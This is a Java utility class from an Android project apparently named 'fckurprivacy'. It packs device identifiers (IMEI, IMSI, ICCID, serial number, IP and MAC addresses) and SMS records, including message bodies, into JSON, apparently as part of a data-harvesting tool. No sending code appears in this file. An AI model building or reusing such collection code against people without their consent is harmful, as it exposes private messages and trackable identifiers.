package com.vergermiya.harevost.fckurprivacy.Util;

import com.vergermiya.harevost.fckurprivacy.InfoChecker.InfoJson;
import com.vergermiya.harevost.fckurprivacy.SmsChecker.SmsJson;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONStringer;

import java.util.ArrayList;

/**
 * Created by harevost on 18-7-17.
 */


public class JsonBuilder {
    public JsonBuilder() {
        super();
    }

    public static JSONStringer buildInfoJson(InfoJson infoJson) {
        JSONStringer jsonText = new JSONStringer();
        try {
            jsonText.object();

            jsonText.key("Imei").value(infoJson.getImei());
            jsonText.key("Imsi").value(infoJson.getImsi());
            jsonText.key("DeviceVersion").value(infoJson.getDeviceVersion());
            jsonText.key("Iccid").value(infoJson.getIccid());
            jsonText.key("SerialNo").value(infoJson.getSerialNo());
            jsonText.key("DeviceType").value(infoJson.getDeviceType());
            jsonText.key("Ip").value(infoJson.getIp());
            jsonText.key("NetworkMac").value(infoJson.getNetworkMac());
            jsonText.key("BluetoothMac").value(infoJson.getBluetoothMac());

            jsonText.endObject();
        } catch (JSONException e) {
            e.printStackTrace();
        }
        return jsonText;
    }

    public static JSONStringer buildSmsJson(SmsJson smsJson) {
        JSONStringer jsonText = new JSONStringer();
        try {
            jsonText.object();

            jsonText.key("PhoneNumber").value(smsJson.getPhoneNumber());
            jsonText.key("ThreadId").value(smsJson.getThreadId());
            jsonText.key("Date").value(smsJson.getDate());
            jsonText.key("Type").value(smsJson.getType());
            jsonText.key("Body").value(smsJson.getBody());

            jsonText.endObject();
        } catch (JSONException e) {
            e.printStackTrace();
        }
        return jsonText;
    }

    public static JSONArray buildSmsJsons(ArrayList<SmsJson> smsJsons) {
        JSONArray jsonArray = new JSONArray();
        for (SmsJson smsJson : smsJsons) {
            JSONStringer jsonText = new JSONStringer();
            try {
                jsonText.object();

                jsonText.key("PhoneNumber").value(smsJson.getPhoneNumber());
                jsonText.key("ThreadId").value(smsJson.getThreadId());
                jsonText.key("Date").value(smsJson.getDate());
                jsonText.key("Type").value(smsJson.getType());
                jsonText.key("Body").value(smsJson.getBody());

                jsonText.endObject();
            } catch (JSONException e) {
                e.printStackTrace();
            }
            jsonArray.put(jsonText);
        }
        return jsonArray;
    }
}





